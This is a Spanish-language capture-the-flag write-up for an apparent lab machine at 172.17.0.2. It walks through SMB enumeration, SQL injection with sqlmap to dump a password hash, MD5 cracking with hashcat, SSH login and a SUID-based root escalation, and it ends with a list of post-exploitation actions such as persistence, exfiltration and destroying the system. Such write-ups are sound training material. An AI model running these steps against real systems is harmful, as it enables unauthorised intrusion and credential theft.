# 🛡️ SMB - MD5

## 1. 📡 Comprobación de Conectividad

```bash
ping 172.17.0.2
```

---

## 2. 🔍 Escaneo de Puertos Abiertos

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 172.17.0.2
```

✅ Puertos abiertos detectados:

```
PORT    STATE SERVICE      REASON
22/tcp  open  ssh          syn-ack ttl 64
80/tcp  open  http         syn-ack ttl 64
139/tcp open  netbios-ssn  syn-ack ttl 64
445/tcp open  microsoft-ds syn-ack ttl 64
```

---

## 3. 🔎 Detección de Versiones de Servicios

```bash
nmap -p22,80,139,445 -sCV 172.17.0.2
```

| Puerto | Servicio                        |
|--------|----------------------------------|
| 22/tcp | OpenSSH 8.9p1 (Ubuntu)           |
| 80/tcp | Apache httpd 2.4.52 (Ubuntu)     |
| 139/445 | Samba smbd 4.x                  |

---

## 4. 📂 Enumeración de Servicios SMB

### enum4linux

```bash
enum4linux -a 172.17.0.2
```

| Parte del Comando                     | Descripción                                                                 |
|--------------------------------------|-----------------------------------------------------------------------------|
| `enum4linux`                         | Herramienta de enumeración para servicios SMB (usa herramientas como smbclient, rpcclient, etc). |
| `-a`                                 | Ejecuta **todas las pruebas disponibles**. Es equivalente a usar varias opciones combinadas. |
| `172.17.0.2`                         | Dirección IP del objetivo a escanear.                                       |

---

Y esta es una tabla con **las funciones que ejecuta internamente** al usar `-a`:

| Función Interna                       | Herramienta Usada | Descripción                                                                 |
|--------------------------------------|-------------------|-----------------------------------------------------------------------------|
| Enumerar información del sistema     | `nmblookup`, `smbclient` | Obtiene el nombre NetBIOS, dominio, y más.                                  |
| Enumerar usuarios del sistema        | `rpcclient`, `samrdump`  | Lista de usuarios (ej. `dylan`, `guest`, etc).                              |
| Enumerar grupos                      | `rpcclient`        | Intenta listar los grupos y sus miembros.                                   |
| Recursos compartidos (shares)       | `smbclient`, `rpcclient` | Muestra los discos y carpetas compartidas (`shared`, `IPC$`, `print$`, etc).|
| Enumerar políticas de contraseñas    | `rpcclient`        | Reglas de contraseñas (longitud mínima, historial, etc).                    |
| RID Brute Force                      | `rpcclient`        | Intenta descubrir usuarios usando rangos de RID (como 500-550, 1000-1050).  |
| Listado de grupos locales            | `rpcclient`        | Obtiene grupos del sistema y sus miembros.                                  |
| Enumeración de la red               | `nmblookup`, `nbtscan`  | Muestra otras máquinas en el dominio o red si es posible.                   |

---

✅ Usuario descubierto: `dylan`  
✅ Recursos compartidos visibles:

```
Sharename       Type      Comment
---------       ----      -------
print$          Disk      Printer Drivers
shared          Disk      
IPC$            IPC       IPC Service (Samba, Ubuntu)
```

**Usuarios locales:**

- dylan  
- augustus  
- bob

---

### smbclient

```bash
smbclient -L //172.17.0.2 -N
```

| Parte del Comando                     | Significado                                                                 |
|--------------------------------------|-----------------------------------------------------------------------------|
| `smbclient`                          | Cliente SMB en modo línea de comandos, similar a un cliente FTP pero para SMB. |
| `-L`                                 | Opción para **listar los recursos compartidos** en el host remoto.          |
| `//172.17.0.2`                       | Ruta SMB del objetivo (protocolo //IP).                                     |
| `-N`                                 | Se conecta **sin necesidad de autenticación** (sin usuario ni contraseña).  |

---

Mismos recursos detectados. El protocolo SMB1 no está habilitado.

---

### smbmap

```bash
smbmap -H 172.17.0.2
```

| Parte del Comando        | Descripción                                                                 |
|--------------------------|-----------------------------------------------------------------------------|
| `smbmap`                 | Herramienta para enumerar recursos SMB y sus permisos.                     |
| `-H 172.17.0.2`          | IP del host objetivo al que se desea conectarse y enumerar los recursos.   |

Todos los recursos aparecen como `NO ACCESS`.

---

### rpcclient

```bash
rpcclient -U "" -N 172.17.0.2
```

| Parte del Comando           | Descripción                                                                 |
|-----------------------------|-----------------------------------------------------------------------------|
| `rpcclient`                 | Herramienta para interactuar con servicios RPC de sistemas Windows/Linux.  |
| `-U ""`                     | Indica un **usuario vacío** (sin autenticación).                            |
| `-N`                        | Se conecta **sin contraseña**.                                              |
| `172.17.0.2`                | Dirección IP del objetivo.                                                  |

Enumeración de usuarios:

```
user:[dylan] rid:[0x3e9]
```

Consulta de usuario `501` (`nobody`) no proporciona información útil.

---

### crackmapexec

```bash
crackmapexec smb 172.17.0.2 --users users.txt --continue-on-success
```

| Parte del Comando                            | Descripción                                                                 |
|----------------------------------------------|-----------------------------------------------------------------------------|
| `crackmapexec`                               | Herramienta para evaluar servicios SMB, RDP, WinRM, etc.                   |
| `smb`                                        | Especifica el módulo/protocolo a usar: en este caso, SMB.                  |
| `172.17.0.2`                                 | IP del objetivo.                                                           |
| `--users users.txt`                          | Archivo con nombres de usuario a probar.                                   |
| `--continue-on-success`                      | Continúa ejecutando pruebas incluso si una autenticación tiene éxito.      |

✅ Usuario encontrado: `dylan`

---

## 5. 💉 Inyección SQL

### Enumeración de Bases de Datos

```bash
sqlmap -u http://172.17.0.2/index.php --forms --dbs --batch
```

Bases de datos disponibles:

- information_schema  
- mysql  
- performance_schema  
- **register**  
- sys

### Extracción de Tablas

```bash
sqlmap -u http://172.17.0.2/index.php --forms -D register --tables --batch
```

✅ Tabla: `users`

### Dump de Credenciales

```bash
sqlmap -u http://172.17.0.2/index.php --forms -D register -T users --dump --batch
```

| Username | Password Hash          |
|----------|------------------------|
| dylan    | KJSDFG789FGSDF78       |

---

## 6. 🔓 Acceso a SMB

```bash
smbclient //172.17.0.2/shared -U dylan
```

| Parte del Comando               | Descripción                                                                 |
|---------------------------------|-----------------------------------------------------------------------------|
| `smbclient`                     | Cliente SMB interactivo, similar a FTP, para acceder a recursos compartidos.|
| `//172.17.0.2/shared`           | Ruta del recurso compartido al que se desea acceder (`shared` en la IP dada).|
| `-U dylan`                      | Especifica el nombre de usuario con el que se desea autenticar (`dylan`).   |

Tras obtener acceso a SMB usando el usuario `dylan`, se encuentra un archivo llamado `augustus.txt` con el siguiente hash:

```
061fba5bdfc076bb7362616668de87c8
```

---

## 7. 🧠 Cracking de Hash

```bash
hashcat -m 0 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
```

| Parte del Comando                            | Descripción                                                                 |
|----------------------------------------------|-----------------------------------------------------------------------------|
| `hashcat`                                     | Herramienta de fuerza bruta para crackear hashes.                          |
| `-m 0`                                        | Especifica el tipo de hash: **MD5**.                                        |
| `-a 0`                                        | Modo de ataque: **diccionario simple**.                                     |
| `hash.txt`                                    | Archivo que contiene el hash a crackear.                                    |
| `/usr/share/wordlists/rockyou.txt`           | Diccionario de contraseñas comunes a utilizar en el ataque.                 |

Resultado:

```
061fba5bdfc076bb7362616668de87c8:lovely
```

✅ Contraseña del usuario `augustus`: `lovely`

---

## 8. 🧑‍💻 Acceso SSH

```bash
ssh augustus@172.17.0.2
```

Con la contraseña `lovely`, se obtiene acceso exitoso.

---

## 9. 🚀 Escalada de Privilegios

```bash
find / -perm -4000 -type f 2>/dev/null
```

✅ Se detecta `/usr/bin/env` como posible vector de escalada.

📌 Tras explotación, se obtiene acceso como **root**.

---

## 🔧 Post-Explotación

Con privilegios de root se pueden realizar diversas acciones:

- ✅ Mantener el acceso (persistencia)
- 👤 Crear usuarios ocultos
- 🔐 Añadir claves públicas SSH
- 📦 Exfiltrar información sensible
- 🌐 Explorar la red interna
- 🔀 Hacer pivoting a otras máquinas
- 🧹 Borrar huellas
- 💣 Destruir el sistema (⚠️ uso malicioso)
